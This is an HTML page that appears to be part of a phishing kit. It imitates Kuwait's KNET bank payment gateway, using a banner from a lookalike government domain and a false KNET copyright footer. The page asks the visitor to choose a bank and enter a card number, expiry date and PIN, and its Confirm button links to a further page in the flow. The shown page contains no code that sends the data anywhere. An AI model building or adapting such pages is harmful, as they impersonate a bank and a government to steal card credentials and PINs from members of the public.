<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <script src="https://cdn.tailwindcss.com"></script>
    <title>...</title>
    <!-- Google Fonts -->
    <link
      href="https://fonts.googleapis.com/css2?family=Cairo:wght@300;400;700&display=swap"
      rel="stylesheet"
    />
    <!-- Tailwind -->
    <script src="https://cdn.jsdelivr.net/npm/@tailwindcss/browser@4"></script>
    <style>
      body {
        font-family: "Cairo", sans-serif;
      }
    </style>
  </head>
  <body class="bg-white">
    <main class="w-full md:w-[600px] mx-auto p-4">
      <img
        src="https://moi-gov-kw.com/banner.jpg"
        class="mx-auto rounded-es-xl rounded-se-xl"
      />

      <section
        class="mx-auto my-3 p-4 shadow-lg rounded-xl border-2 border-gray-300"
      >
        <div>
          <img
            src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTiP7GMAYmbc-9nRlyNOHltlBIWzdvCo8bLoQ&s"
            class="mx-auto w-20"
          />
        </div>

        <div class="mt-3">
          <div class="flex items-center py-1 border-b-2 text-sm">
            <h3 class="w-2/5 text-sky-600 font-bold">Merchant:</h3>
            <p class="w-3/5">TBAFCI</p>
          </div>
          <div class="flex items-center py-1 border-b-2 text-sm">
            <h3 class="w-2/5 text-sky-600 font-bold">Amount:</h3>
            <p class="w-3/5">KD 3.5.000</p>
          </div>
        </div>
      </section>

      <section
        class="mx-auto my-3 p-4 shadow-lg rounded-xl border-2 border-gray-300"
      >
        <div>
          <div class="flex items-center py-1 border-b-2 text-sm">
            <label class="w-2/5 text-sky-600 font-bold"
              >Select Your Bank:
            </label>
            <div class="w-3/5">
              <select
                class="w-full bg-gray-200 rounded-full outline-0 cursor-pointer"
              >
                <option>Select Your Bank</option>
                <option>Al Ahli Bank of Kuwait [ABK]</option>
                <option>National Bank of Kuwait [NBK]</option>
                <option>Kuwait Finance House [KFH]</option>
                <option>Burgan Bank</option>
                <option>Gulf Bank</option>
                <option>Commercial Bank of Kuwait</option>
                <option>Ahli United Bank Kuwait</option>
                <option>Boubyan Bank</option>
                <option>Warba Bank</option>
                <option>Industrial Bank of Kuwait</option>
              </select>
            </div>
          </div>
          <div class="flex items-center py-1 border-b-2 text-sm">
            <label class="w-2/5 text-sky-600 font-bold">Card Number: </label>
            <div class="w-3/5 flex gap-1">
              <select
                class="w-1/3 bg-gray-200 rounded-full outline-0 cursor-pointer"
              >
                <option>Prefix</option>
                <option>123456</option>
                <option>123456</option>
                <option>123456</option>
                <option>123456</option>
                <option>123456</option>
              </select>

              <input
                type="text"
                class="w-full border-2 border-sky-600 outline-0 rounded p-1"
              />
            </div>
          </div>
          <div class="flex items-center py-1 border-b-2 text-sm">
            <label class="w-2/5 text-sky-600 font-bold"
              >Expiration Date:
            </label>
            <div class="w-3/5 flex gap-1">
              <select
                class="bg-gray-200 rounded-full outline-0 cursor-pointer text-sm flex-grow"
              >
                <option>MM</option>
                <option>1</option>
                <option>2</option>
                <option>3</option>
                <option>4</option>
                <option>5</option>
                <option>6</option>
                <option>7</option>
                <option>8</option>
                <option>9</option>
                <option>10</option>
                <option>11</option>
                <option>12</option>
              </select>
              <select
                class="bg-gray-200 rounded-full outline-0 cursor-pointer text-sm flex-grow"
              >
                <option>Year</option>
                <option>2024</option>
                <option>2025</option>
                <option>2026</option>
                <option>2027</option>
                <option>2028</option>
                <option>2029</option>
                <option>2030</option>
                <option>2031</option>
                <option>2032</option>
                <option>2033</option>
                <option>2034</option>
              </select>
            </div>
          </div>
          <div class="flex items-center py-1 border-b-2 text-sm">
            <label class="w-2/5 text-sky-600 font-bold">Pin:</label>
            <div class="w-3/5">
              <input
                type="text"
                class="w-full border-2 border-sky-600 outline-0 rounded p-1"
              />
            </div>
          </div>
        </div>
      </section>

      <section
        class="mx-auto my-3 p-4 shadow-lg rounded-xl border-2 border-gray-300"
      >
        <div class="flex justify-center items-center text-sm">
          <a
            href="payment3.html"
            class="w-1/2 text-center bg-gray-200 text-gray-500 font-bold p-1 rounded border border-gray-500"
          >
            Confirm
          </a>
          <button
            class="w-1/2 bg-gray-200 text-gray-500 font-bold p-1 rounded border border-gray-500"
          >
            Cancel
          </button>
        </div>
      </section>

      <footer class="text-center mx-auto text-sm">
        <p>All Rights Reserved. Copyright 2024 Â©</p>
        <p class="text-sky-600 font-bold">
          The Shared Electronic Banking Services Company - KNET
        </p>
      </footer>
    </main>
  </body>
</html>
